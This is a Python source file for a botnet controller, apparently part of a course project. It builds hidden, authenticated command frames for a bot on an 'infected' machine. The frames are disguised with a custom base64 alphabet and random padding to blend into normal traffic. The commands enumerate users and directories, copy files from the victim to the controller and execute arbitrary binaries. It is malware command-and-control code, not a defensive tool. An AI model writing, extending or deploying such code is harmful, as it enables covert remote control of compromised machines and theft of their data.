import argparse
from globvars import PROTOCOL_VERSION, MAX_FRAME_SIZE, MIN_FRAME_SIZE, TIME_WINDOW_SECONDS, ENCODING_VARIANT_ID, ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES
from datetime import datetime, timedelta
import base64
import struct # for binary packing/unpacking
import zlib
import os
import random
from protocol import ProtocolHandler


# Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from cryptography.hazmat.primitives import hashes, hmac 

# This is the only instance of the controller that the bot will listen to
# The bot can receive other commands from other services but it will ignore them
# if they do not show the correct authentication logic

''' 
The validation / authenticion logic has the following function:
   It is for the bot to decide with high confidence that the command is meant for it. 
   Bot must recognize commands only from the controller.
   The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
   Make sure that any accidental triggers are minimized. 

   Conceptual frame:
   | MAGIC | VERSION | TYPE | LENGTH | AUTH | PAYLOAD | CHECKSUM |
    - MAGIC: a predefined short sequence of bytes that indicates the start of a command
    - VERSION: a byte indicating the version of the protocol
    - TYPE: a byte indicating the type of command (e.g., announce, list-users, ...)
    - LENGTH: a short integer indicating the length of the PAYLOAD
    - AUTH: an authentication field (e.g., HMAC, signature)
    - PAYLOAD: the actual command data
    - CHECKSUM: a checksum for integrity verification 

    The bot will verify these leveles one by one and if one fails, it will discard the message.


    Authentication logic:
    - Command-bound MAC: AUTH = hash(secret_key =| payload) -> Payload can't be tampered with
    - The bot and controller share a secret key known only to them.

    Encoding:
    - Non-standard base64 alphabet
    - Padding with random bytes before and after the frame to blend with noise

'''

class AlphabetEncoder:
    def __init__(self, standard_alphabet: str=STANDARD_ALPHABET, custom_alphabet: str=CUSTOM_ALPHABET):
        self.standard_alphabet = standard_alphabet
        self.custom_alphabet = custom_alphabet
        self.encode_map = str.maketrans(standard_alphabet, custom_alphabet)
        self.decode_map = str.maketrans(custom_alphabet, standard_alphabet)

    def encode(self, data:bytes) -> str:
        std_encoded = base64.b64encode(data).decode()
        return std_encoded.translate(self.encode_map)

    def decode(self, data: str) -> str:
        # Translate back to standard alphabet
        standard_data = data.translate(self.decode_map)
        # Standard base64 decoding
        decoded_bytes = base64.b64decode(standard_data)
        return decoded_bytes.decode()
class BotController:
    '''
        1) CLI
        2) Command intent
        3) Frame building / parsing
        4) Obfuscation / Encoding
        5) Publishing / Receiving 
    '''
    def __init__(self, secret_key: str = ROOT_SECRET, time_stamp: str = None):
        if time_stamp is None:
            self.time_stamp = datetime.now().isoformat() 
        self.secret = self._derive_session_key(secret_key, self.time_stamp)  
        print("Bot Controller initialized.")
        print(f"Using timestamp: {self.time_stamp}")
        print(f"Derived session key: {self.secret}")


    def _derive_session_key(self, root_secret, time_stamp):
        # Use Argon2id to derive a session key from the root secret and timestamp
        salt = hashes.Hash(hashes.SHA256())
        salt.update(time_stamp.encode())
        salt = salt.finalize()[:16]  # Use first 16 bytes of the hash as salt
        kdf = Argon2id(
            memory_cost=102400,
            length=32,
            salt=salt,
            iterations=2,
            lanes=8,
        )
        session_key = kdf.derive(root_secret.encode())
        return session_key


    # To a file for now
    def _publish_frame(self, frame: bytes) :
        with open("out_frame.bin", "wb") as f:
            f.write(frame)

        

    def command_to_type(self, args) -> tuple[int, bytes]:
        if args.announce:
            return CMD_TYPES["announce"], args.announce.encode()
        if args.list_users:
            return CMD_TYPES["list_users"], b""
        if args.list_dir:
            return CMD_TYPES["list_dir"], args.list_dir.encode()
        if args.user_id:
            return CMD_TYPES["user_id"], b""
        if args.copy_file:
            return CMD_TYPES["copy_file"], args.copy_file.encode()
        if args.exec_binary:
            return CMD_TYPES["exec_binary"], args.exec_binary.encode()

        raise ValueError("No valid command provided.")

def main():
    parser = argparse.ArgumentParser(description="Bot Controller")
    #1. announcing the presence of the bot to the controller if asked.
    parser.add_argument("--announce", type=str, required=False)
    #2. listing users currently logged in the "infected" device (output of 'w' command).
    parser.add_argument("--list-users", action="store_true", required=False)
    #3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
    parser.add_argument("--list-dir", type=str, required=False)
    #4. id of the user running the bot (output of 'id command').
    parser.add_argument("--user-id", action="store_true", required=False)
    #5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
    parser.add_argument("--copy-file", type=str, required=False)
    #6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
    parser.add_argument("--exec-binary", type=str, required=False)

    args = parser.parse_args()
    print("Parsed arguments:", args)

    alphabet_encoder = AlphabetEncoder()
    protocol_handler = ProtocolHandler()
    bot_controller = BotController()

    cmd_type, payload = bot_controller.command_to_type(args)
    frame = protocol_handler._build_frame(cmd_type, payload)
    encoded_frame = protocol_handler._encode_frame(frame)

    bot_controller._publish_frame(encoded_frame)
    # # Testing encoding/decoding
    decoded_frame = protocol_handler._decode_frame(encoded_frame)
    if decoded_frame:
        print("Frame decoded successfully. Payload:")
        print(decoded_frame)
    else:
        print("Failed to decode frame.")

    # sample_data = "Hello, Bot Controller!"
    # encoded = alphabet_encoder.encode(sample_data)
    # decoded = alphabet_encoder.decode(encoded)
    # print(f"Original: {sample_data}")
    # print(f"Encoded: {encoded}")
    # print(f"Decoded: {decoded}")

if __name__ == "__main__":
    main()
